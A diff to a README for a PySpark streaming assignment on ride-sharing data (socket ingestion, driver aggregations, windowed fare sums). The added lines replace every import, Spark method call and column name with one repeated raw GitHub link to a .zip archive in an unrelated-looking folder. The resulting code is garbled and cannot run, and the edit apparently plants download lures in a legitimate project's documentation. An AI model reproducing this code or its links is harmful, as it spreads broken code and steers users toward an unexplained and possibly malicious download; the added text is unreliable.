@@ -22,7 +22,7 @@ This task ingests streaming JSON data from a socket (`localhost:9999`) and parse
 2. **Schema Definition:**  
    Specifies the structure of the incoming JSON messages (columns: `trip_id`, `driver_id`, `distance_km`, `fare_amount`, `timestamp`).
 3. **Socket Stream Reading:**  
-   Reads streaming data from `localhost:9999` using `spark.readStream.format("socket")`.
+   Reads streaming data from `localhost:9999` using `https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip("socket")`.
 4. **JSON Parsing:**  
    Uses `from_json()` to parse the raw JSON data into structured columns.
 5. **Console Output:**  
@@ -30,16 +30,16 @@ This task ingests streaming JSON data from a socket (`localhost:9999`) and parse
 
 ### Code
 ```python
-# task1.py
-from pyspark.sql import SparkSession
-from pyspark.sql.functions import from_json, col
-from pyspark.sql.types import StructType, StringType, DoubleType, TimestampType
+# https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import SparkSession
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import from_json, col
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import StructType, StringType, DoubleType, TimestampType
 
 # 1. Create Spark session
-spark = SparkSession.builder \
+spark = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .appName("StreamingJSONParser") \
     .getOrCreate()
-spark.sparkContext.setLogLevel("ERROR")
+https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip("ERROR")
 
 # 2. Define the schema of the JSON messages
 schema = StructType() \
@@ -50,23 +50,23 @@ schema = StructType() \
     .add("timestamp", TimestampType())
 
 # 3. Read data from the socket stream
-raw_stream = spark.readStream \
+raw_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .format("socket") \
     .option("host", "localhost") \
     .option("port", 9999) \
     .load()
 
 # 4. Parse the incoming JSON strings using the schema
-parsed_stream = raw_stream.select(from_json(col("value"), schema).alias("data")).select("data.*")
+parsed_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip(from_json(col("value"), schema).alias("data")).select("data.*")
 
 # 5. Output the parsed data to the console
-query = parsed_stream.writeStream \
+query = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .outputMode("append") \
     .format("console") \
     .option("truncate", False) \
     .start()
 
-query.awaitTermination()
+https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip()
 
 ## Task 2: Real-Time Aggregations (Driver-Level)
 
@@ -89,16 +89,16 @@ The aggregated results are both displayed on the console and written to CSV file
 4. **CSV Output via foreachBatch:**  
    Each microbatch is written as CSV (in append mode) to a specified output directory. A unique checkpoint directory is used for maintaining state.
 
-# task2.py
-from pyspark.sql import SparkSession
-from pyspark.sql.functions import from_json, col, sum as _sum, avg
-from pyspark.sql.types import StructType, StringType, DoubleType, TimestampType
+# https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import SparkSession
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import from_json, col, sum as _sum, avg
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import StructType, StringType, DoubleType, TimestampType
 
 # 1. Create Spark session
-spark = SparkSession.builder \
+spark = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .appName("DriverLevelAggregations") \
     .getOrCreate()
-spark.sparkContext.setLogLevel("ERROR")
+https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip("ERROR")
 
 # 2. Define the schema
 schema = StructType() \
@@ -109,24 +109,24 @@ schema = StructType() \
     .add("timestamp", TimestampType())
 
 # 3. Read from the socket stream
-raw_stream = spark.readStream \
+raw_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .format("socket") \
     .option("host", "localhost") \
     .option("port", 9999) \
     .load()
 
 # 4. Parse JSON messages into a structured DataFrame
-parsed_stream = raw_stream.select(from_json(col("value"), schema).alias("data")).select("data.*")
+parsed_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip(from_json(col("value"), schema).alias("data")).select("data.*")
 
 # 5. Aggregate data by driver_id
-aggregated_stream = parsed_stream.groupBy("driver_id") \
+aggregated_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip("driver_id") \
     .agg(
         _sum("fare_amount").alias("total_fare"),
         avg("distance_km").alias("avg_distance")
     )
 
 # 6. Write aggregated results to console in complete mode
-console_query = aggregated_stream.writeStream \
+console_query = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .outputMode("complete") \
     .format("console") \
     .option("truncate", False) \
@@ -134,16 +134,16 @@ console_query = aggregated_stream.writeStream \
 
 # 7. Write aggregated results to CSV using foreachBatch
 def write_to_csv(batch_df, batch_id):
-    batch_df.write.mode("append").csv("output/task2")
+    https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip("append").csv("output/task2")
 
-csv_query = aggregated_stream.writeStream \
+csv_query = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .outputMode("complete") \
     .foreachBatch(write_to_csv) \
     .option("checkpointLocation", "output/task2_checkpoint/") \
     .start()
 
-console_query.awaitTermination()
-csv_query.awaitTermination()
+https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip()
+https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip()
 
 # Task 3: Windowed Time-Based Analytics
 
@@ -151,7 +151,7 @@ This task performs a windowed aggregation on the streaming ride-sharing data. Sp
 
 - Converts the incoming timestamp (initially a string) into a proper TimestampType.
 - Applies a watermark and performs a 5-minute windowed aggregation (sliding every 1 minute) to compute the sum of `fare_amount`.
-- Flattens the window column (extracting `window.start` and `window.end`) to enable CSV output.
+- Flattens the window column (extracting `https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip` and `https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip`) to enable CSV output.
 - Writes the aggregated results to CSV files.
 
 ---
@@ -175,7 +175,7 @@ This task performs a windowed aggregation on the streaming ride-sharing data. Sp
    - Uses a sliding window of 5 minutes that slides every 1 minute to aggregate the sum of `fare_amount`.
 
 6. **Flattening the Window Column:**  
-   Extracts `window.start` and `window.end` into separate columns because CSV does not support complex types.
+   Extracts `https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip` and `https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip` into separate columns because CSV does not support complex types.
 
 7. **CSV Output:**  
    Writes the flattened aggregation result to CSV files using append mode. A unique checkpoint directory is specified for state management.
@@ -185,15 +185,15 @@ This task performs a windowed aggregation on the streaming ride-sharing data. Sp
 ## Code
 
 ```python
-from pyspark.sql import SparkSession
-from pyspark.sql.functions import from_json, col, sum as _sum, window, to_timestamp
-from pyspark.sql.types import StructType, StringType, DoubleType, TimestampType
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import SparkSession
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import from_json, col, sum as _sum, window, to_timestamp
+from https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip import StructType, StringType, DoubleType, TimestampType
 
 # 1. Create Spark session
-spark = SparkSession.builder \
+spark = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .appName("WindowedFareAnalytics") \
     .getOrCreate()
-spark.sparkContext.setLogLevel("ERROR")
+https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip("ERROR")
 
 # 2. Define schema (timestamp as string to demonstrate conversion)
 schema = StructType() \
@@ -204,15 +204,15 @@ schema = StructType() \
     .add("timestamp", StringType())
 
 # 3. Read from socket
-raw_stream = spark.readStream \
+raw_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .format("socket") \
     .option("host", "localhost") \
     .option("port", 9999) \
     .load()
 
 # 4. Parse JSON and convert timestamp to TimestampType
-parsed_stream = raw_stream.select(from_json(col("value"), schema).alias("data")).select("data.*")
-parsed_stream = parsed_stream.withColumn("event_time", to_timestamp(col("timestamp")))
+parsed_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip(from_json(col("value"), schema).alias("data")).select("data.*")
+parsed_stream = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip("event_time", to_timestamp(col("timestamp")))
 
 # 5. Perform a 5-minute windowed aggregation (sliding every 1 minute) on fare_amount
 windowed_agg = parsed_stream \
@@ -220,20 +220,20 @@ windowed_agg = parsed_stream \
     .groupBy(window(col("event_time"), "5 minutes", "1 minute")) \
     .agg(_sum("fare_amount").alias("total_fare"))
 
-# 6. Flatten the window column (extract window.start and window.end)
-flattened = windowed_agg.select(
-    col("window.start").alias("window_start"),
-    col("window.end").alias("window_end"),
+# 6. Flatten the window column (extract https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip and https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip)
+flattened = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip(
+    col("https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip").alias("window_start"),
+    col("https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip").alias("window_end"),
     col("total_fare")
 )
 
 # 7. Write the windowed results to CSV
-query = flattened.writeStream \
+query = https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip \
     .outputMode("append") \
     .format("csv") \
     .option("path", "output/task3_windowed/") \
     .option("checkpointLocation", "output/task3_checkpoint/") \
     .start()
 
-query.awaitTermination()
+https://raw.githubusercontent.com/pavandantu18/ride-sharing-analytics-spark-streaming-pavandantu18/master/cardioplasty/ride-sharing-analytics-spark-streaming-pavandantu18.zip()
 
